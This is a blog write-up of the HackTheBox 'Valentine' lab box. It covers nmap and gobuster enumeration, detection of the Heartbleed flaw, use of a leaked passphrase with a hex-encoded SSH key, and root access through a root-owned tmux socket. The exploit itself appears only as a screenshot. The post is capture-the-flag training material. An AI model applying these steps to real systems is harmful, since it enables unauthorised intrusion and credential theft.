---
layout: post
title: HackTheBox - Valentine write-up
---
Nmap TCP scan result:

```
nmap -sC -sV 10.10.10.79 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 19:56 EDT
Nmap scan report for 10.10.10.79
Host is up (0.91s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-08-22T00:05:06+00:00; +8m08s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 8m07s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
```

Let's enumerate port 80 with `gobuster`:
```
gobuster dir -u http://10.10.10.79/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -x php,txt -t 30 -q

/index (Status: 200)
/index.php (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/decode (Status: 200)
/decode.php (Status: 200)
/omg (Status: 200)
```
<!--more-->
`/dev` directory contains two interesting files (I saved `hype_key` locally):
{:refdef: style="text-align: center;"}
![](/images/6d2748e7134b4317ac6c258320d9315e.png)
{: refdef}
At this point Nmap vulnerability scan (`--script=vuln` option) I ran in the background informs me that OpenSSL at port 443 is vulnerable to the Heartbleed bug:
```
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt
```

`sslyze` scan confirms that the vulnerability is present:
```
sslyze --heartbleed 10.10.10.79

* OpenSSL Heartbleed:
VULNERABLE - Server is vulnerable to Heartbleed
```
I quickly search for the exploit on ExploitDB and run it:
{:refdef: class="wrapper-image"}
![](/images/b860c98e08d044fea889bbaa0263bc66.png)
{: refdef}
Vulnerable server "bleeds" base64 encoded string `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`, which can be easily decoded in the command line:

```
echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d

heartbleedbelievethehype
```
Now, let's inspect `hype_key` we saved:
{:refdef: class="wrapper-image"}
![](/images/6301d16d3ae5484fad6b1eabab1b1518.png)
{: refdef}
Thankfully, I know that `2d` in hex is dash, `-`, in ASCII.<br>After converting hex to ASCII, it turns out that `hype_key` is actually a private SSH key, to which I assign correct key file permissions using `chmod 600 loot/hype.key` command.<br><br>At this point I believe that `heartbleedbelievethehype` is a passphrase intended for use with this key.<br><br>The next step is to check this assumption:
{:refdef: class="wrapper-image"}
![](/images/3a64a05c59de4169be62e4c71758e093.png)
{: refdef}
Now we have a low-privileged shell. Let's quickly escalate to root.

`.bash_history` has an entry related to `tmux` session, and `tmux` socket file happens to be owned by root. File group, however, is **hype**.
{:refdef: class="wrapper-image"}
![](/images/8dc2f7505e094475aae560c6cee74f72.png)
{: refdef}
Therefore, privesc here is as simple as running `tmux -S /.devs/dev_sess`:

{:refdef: class="wrapper-image"}
![](/images/7231ebe61d4e47f1b4741bca20bfe32e.png)
{: refdef}






